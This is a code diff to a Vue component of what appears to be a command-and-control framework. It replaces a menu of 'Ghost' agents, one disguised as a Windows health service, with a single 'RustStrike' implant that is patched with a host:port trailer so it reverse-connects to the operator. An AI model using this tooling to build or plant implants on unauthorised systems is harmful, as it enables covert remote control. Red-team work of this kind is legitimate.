@@ -83,72 +83,35 @@ const saveCachedForm = () => {
 }
 
 const fetchAvailableAgents = async () => {
-  try {
-    // 还原原始逻辑：获取当前监听器支持的 agents
-    const res = await api.get(`/listeners/${props.listener.id}/agents`)
-    availableAgents.value = res.data.data || []
-
-    // 添加额外的 agent 选项（所有 agent 现在都支持自定义 sleep 时间）
-    const additionalAgents = [
-      {
-        id: 'ghost',
-        name: 'Ghost Agent',
-        description: 'Minimal ghost agent with server-side sysinfo collection'
-      },
-      {
-        id: 'ghost_debug',
-        name: 'Ghost Agent (Debug)',
-        description: 'Ghost agent with debug symbols'
-      },
-      {
-        id: 'system_health',
-        name: 'System Health Check',
-        description: 'Disguised as Windows system health service'
-      }
-    ]
-
-    // 添加不存在的 agent 选项
-    additionalAgents.forEach(agent => {
-      const exists = availableAgents.value.some(a => a.id === agent.id)
-      if (!exists) {
-        availableAgents.value.push(agent)
-      }
-    })
-
-    if (availableAgents.value.length > 0) {
-      const hasCached = availableAgents.value.some(a => a.id === form.agent_type)
-      if (!hasCached) form.agent_type = availableAgents.value[0].id
-    }
-  } catch (err) {}
+  // The stub builder produces a single implant variant (host:port trailer).
+  // No per-listener agent menu in real mode; keep a single option for the UI.
+  availableAgents.value = [{ id: 'ruststrike-implant', name: 'RustStrike Implant', description: 'BOF implant with baked-in callback' }]
+  form.agent_type = 'ruststrike-implant'
 }
 
 const submit = async () => {
-  if (!form.agent_type || !form.host) return
+  if (!form.host) return
   loading.value = true
   try {
-    // 还原原始生成逻辑：
-    // GET /listeners/{id}/generate?agent_type={type}&host={host}&sleep_time={sleep_time}
-    const url = `/listeners/${props.listener.id}/generate?agent_type=${form.agent_type}&host=${form.host}&sleep_time=${form.sleep_time}`
-    const response = await api.get(url, { responseType: 'blob' })
-    
-    // 处理文件下载
-    const blob = new Blob([response.data], { type: 'application/octet-stream' })
-    const downloadUrl = window.URL.createObjectURL(blob)
-    const link = document.createElement('a')
-    link.href = downloadUrl
-    
-    // 根据模板名称生成文件名
-    const ext = form.agent_type.includes('dll') ? 'dll' : 'exe'
-    link.setAttribute('download', `ghost_${props.listener.name}_${form.agent_type}.${ext}`)
-    
-    document.body.appendChild(link)
-    link.click()
-    document.body.removeChild(link)
-    
-    toast.success('Agent compilation successful')
+    // Build a patched implant stub via the Go core: it appends a host:port
+    // trailer to a prebuilt ruststrike-implant.exe so the agent reverse-
+    // connects with no CLI args. The port comes from the listener. The Go
+    // bridge then pops the OS "Save As" dialog so the operator chooses where
+    // to save the agent exe (no browser blob download, no fixed project path).
+    const port = String(props.listener?.port ?? '')
+    const safeName = String(props.listener?.name || 'agent').replace(/[^a-z0-9_-]/gi, '_')
+    const name = `ruststrike_${safeName}_${form.host}_${port}`
+    const res = await api.post('/stub/build', { host: form.host, port, name })
+    const p = res.data?.data?.path
+    if (!p) {
+      // empty path = operator cancelled the Save As dialog
+      modalStore.close()
+      return
+    }
+    toast.success(`Agent stub saved: ${p}`)
     modalStore.close()
   } catch (err: any) {
-    // 错误处理已集成在拦截器
+    toast.error(err?.message || 'Agent generation failed')
   } finally {
     loading.value = false
   }
